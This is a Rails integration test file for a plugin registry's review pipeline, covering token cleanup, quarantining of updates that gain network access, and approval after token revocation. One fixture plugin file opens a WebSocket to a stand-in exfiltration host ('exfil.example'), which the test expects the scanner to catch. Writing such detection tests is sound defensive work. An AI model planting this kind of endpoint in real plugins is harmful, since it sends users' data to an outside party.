require "test_helper"

# Round 41: referenced tokens survive cleanup, literal WebSocket endpoints are
# network capability growth, and admin approval provenance bypasses the
# credential-liveness veto (no endless approval loop).
class MomusRoundFortyOneTest < ActionDispatch::IntegrationTest
  setup do
    @admin = User.create!(email_address: "admin@example.com", name: "Admin", admin: true,
      otp_secret: ROTP::Base32.random, otp_enabled_at: Time.current)
    @dev = User.create!(email_address: "dev@example.com", name: "Dev",
      otp_secret: ROTP::Base32.random, otp_enabled_at: Time.current)
    @publisher = Publisher.create!(name: "acme", kind: :org)
    Membership.create!(publisher: @publisher, user: @dev, role: :owner, founding: true)
  end

  teardown do
    Rails.application.config.x.enforce_review_policy = false
    Rails.application.config.x.publish_hold = 0
  end

  test "cleanup preserves aged tokens still referenced by a version and deletes unreferenced ones" do
    referenced = ApiToken.mint!(user: @dev, publisher: @publisher, plugin_name: "weather")
    unreferenced = ApiToken.mint!(user: @dev, publisher: @publisher, plugin_name: "widget")
    version = nil
    perform_enqueued_jobs do
      version = Registry::PublishVersion.new(user: @dev, publisher: @publisher, plugin_name: "weather",
        tarball_bytes: TarballBuilder.build, token: referenced).call
    end
    assert_equal referenced, version.reload.api_token

    ApiToken.where(id: [ referenced.id, unreferenced.id ]).update_all(expires_at: 31.days.ago)
    assert_nothing_raised { Registry::CleanupJob.perform_now }
    assert ApiToken.exists?(referenced.id), "provenance token must survive cleanup"
    assert_not ApiToken.exists?(unreferenced.id), "unreferenced expired token ages out"
  end

  test "a new literal wss:// endpoint is network growth and quarantines the update" do
    perform_enqueued_jobs do
      Registry::PublishVersion.new(user: @dev, publisher: @publisher, plugin_name: "weather",
        tarball_bytes: TarballBuilder.build).call
    end

    v2 = nil
    perform_enqueued_jobs do
      v2 = Registry::PublishVersion.new(user: @dev, publisher: @publisher, plugin_name: "weather",
        tarball_bytes: TarballBuilder.build(
          manifest: TarballBuilder.manifest(version: "1.1.0"),
          files: { "Widget.qml" => "import QtQuick\nItem { WebSocket { url: \"wss://exfil.example/ws\" } }\n" }
        )).call
    end

    v2.reload
    assert v2.quarantined?, "wss endpoint growth must quarantine (was #{v2.state})"
    assert_includes (v2.scan_results["capability_growth"] || []).join(" "), "network"
    assert_includes v2.capability_fingerprint["network"].to_a.join(" "), "exfil.example"
  end

  test "admin approval provenance releases through the hold even if the token was revoked" do
    Rails.application.config.x.publish_hold = 1.hour
    token = ApiToken.mint!(user: @dev, publisher: @publisher, plugin_name: "weather")
    post "/api/v1/plugins/acme/weather/versions", params: TarballBuilder.build,
      headers: { "Authorization" => "Bearer #{token.plaintext_token}", "Content-Type" => "application/gzip" }
    assert_response :created
    perform_enqueued_jobs(at: Time.current)
    version = PluginVersion.last
    assert version.reload.held?

    # Stolen-token response: revoke → pipeline release diverts to human review
    token.revoke!
    Registry::ReleaseVersion.call(version)
    assert version.reload.quarantined?

    # Human reviews the bytes and approves — provenance persists through the
    # NEW hold window, and the release goes live instead of looping forever
    sign_in_as @admin
    post approve_admin_version_path(version)
    assert version.reload.held?
    assert version.approved_at.present?
    assert_equal @admin, version.approved_by

    travel_to version.hold_until + 1.minute do
      Registry::ReleaseVersion.call(version)
    end
    assert version.reload.published?, "approved release must not re-quarantine on the revoked token"
  end
end
